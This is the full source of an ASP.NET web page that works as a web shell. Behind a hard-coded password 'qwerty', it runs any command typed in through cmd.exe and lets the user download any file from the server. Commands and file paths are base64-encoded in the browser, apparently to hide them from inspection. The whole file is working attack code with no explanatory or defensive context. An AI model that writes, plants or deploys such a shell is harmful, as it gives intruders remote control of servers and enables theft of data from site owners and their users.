<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    private const string AUTHKEY = "qwerty";

    private const string HEADER = "<html>\n<head>\n<title>command</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    protected void Page_Load(object sender, EventArgs e)
    {
    }

    protected void btnExecute_Click(object sender, EventArgs e)
    {
        if (txtAuthKey.Text != AUTHKEY)
        {
            return;
        }

        Response.Write(HEADER);
        Response.Write("<pre>");
        Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));
        Response.Write("</pre>");
        Response.Write(FOOTER);
    }

    private string ExecuteCommand(string command)
    {
        try
        {
            var base64EncodedBytes = System.Convert.FromBase64String(command);
            command = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);

            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.RedirectStandardError = true;
            processStartInfo.UseShellExecute = false;

            Process process = Process.Start(processStartInfo);
            string stdout = "";
            using (StreamReader streamReader = process.StandardOutput)
            {
                stdout = streamReader.ReadToEnd();
            }

            string stderr = "";
            using (StreamReader streamReader = process.StandardError)
            {
                stderr = streamReader.ReadToEnd();
            }

            if (stderr.Trim().Length == 0)
            {
                return stdout;
            }
            else
            {
                return stdout + "\nError: " + stderr;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    protected void btnDownload_Click(object sender, EventArgs e)
    {
        if (txtAuthKey.Text != AUTHKEY)
        {
            return;
        }

        this.DownloadFile(txtFile.Text);
    }

    private string DownloadFile(string file)
    {
        try
        {
            var base64EncodedBytes = System.Convert.FromBase64String(file);
            file = System.Text.Encoding.UTF8.GetString(base64EncodedBytes);

            Response.ClearContent();
            Response.ClearHeaders();
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
            Response.AddHeader("Content-Length", new FileInfo(file).Length.ToString());
            Response.WriteFile(file);
            Response.Flush();
            Response.Close();

            return "File downloaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>Command</title>
</head>
<body>
    <form id="form" runat="server">
    <div>
        <table>
            <tr>
                <td width="30">Auth Key:</td>
                <td><asp:TextBox id="txtAuthKey" runat="server"></asp:TextBox></td>
            </tr>
            <tr>
                <td width="30">Command:</td>
                <td><asp:TextBox ID="txtCommand" runat="server" Width="820px"></asp:TextBox></td>
                <td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
                <td width="30">File:</td>
                <td><asp:TextBox ID="txtFile" runat="server" Width="820px"></asp:TextBox></td>
                <td><asp:Button ID="btnDownload" runat="server" OnClick="btnDownload_Click" Text="Download" /></td>
            </tr>
        </table>
    </div>
    </form>
    
<script>
    function encrypt(s) {
        return btoa(s);
    }

    function decrypt(s) {
        return atob(s);
    }

    function callback() {
        var txtCommand = document.getElementById("txtCommand");
        txtCommand.value = encrypt(txtCommand.value);

        var txtFile = document.getElementById("txtFile");
        txtFile.value = encrypt(txtFile.value);

        return true;
    }

    var ele = document.getElementById("form");
    if (ele.addEventListener) {
        ele.addEventListener("submit", callback, false);  //Modern browsers
    } else if (ele.attachEvent) {
        ele.attachEvent('onsubmit', callback);            //Old IE
    }

    // on load
    var txtCommand = document.getElementById("txtCommand");
    txtCommand.value = decrypt(txtCommand.value);

    var txtFile = document.getElementById("txtFile");
    txtFile.value = decrypt(txtFile.value);
</script>
</body>
</html>